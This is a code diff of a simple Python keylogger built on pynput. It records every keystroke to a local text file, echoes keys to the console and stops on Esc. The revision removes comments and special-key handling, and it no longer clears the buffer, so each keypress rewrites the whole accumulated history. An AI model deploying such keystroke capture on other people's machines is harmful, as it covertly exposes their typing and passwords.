@@ -1,35 +1,23 @@
 from pynput.keyboard import Key, Listener
 
-keys = []  # Renamed from Key to avoid conflict
+k=[]
 
 def on_press(key):
-    keys.append(key)
-    write_file(keys)
+    k.append(key)
+    write_1(k)
+    print(key)
 
-    try:
-        print('Alphanumeric key {0} pressed'.format(key.char))
-    except AttributeError:
-        print('Special key {0} pressed'.format(key))
-
-def write_file(keys):
-    with open('log.txt', 'a') as f:  # Open in append mode
-        for key in keys:
-            k = str(key).replace("'", "")
-            # Handle special keys like space, enter
-            if k == "Key.space":
-                f.write(" ")  # Add a space
-            elif k == "Key.enter":
-                f.write("\n")  # Add a newline
-            elif k.startswith("Key."):
-                continue  # Skip other special keys
-            else:
-                f.write(k)  # Write alphanumeric keys
-        keys.clear()  # Clear the keys list after writing
+def write_1(var):
+    with open("demo.txt","a") as f:
+        for i in var: 
+            new_var=str(i).replace("'",'')
+            f.write(new_var) 
+            f.write(" ") 
+            
 
 def on_release(key):
-    print('{0} released'.format(key))
     if key == Key.esc:
-        return False  # Stop the listener
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+        return False
+                  
+with Listener(on_press=on_press,on_release=on_release) as l:
+    l.join()              
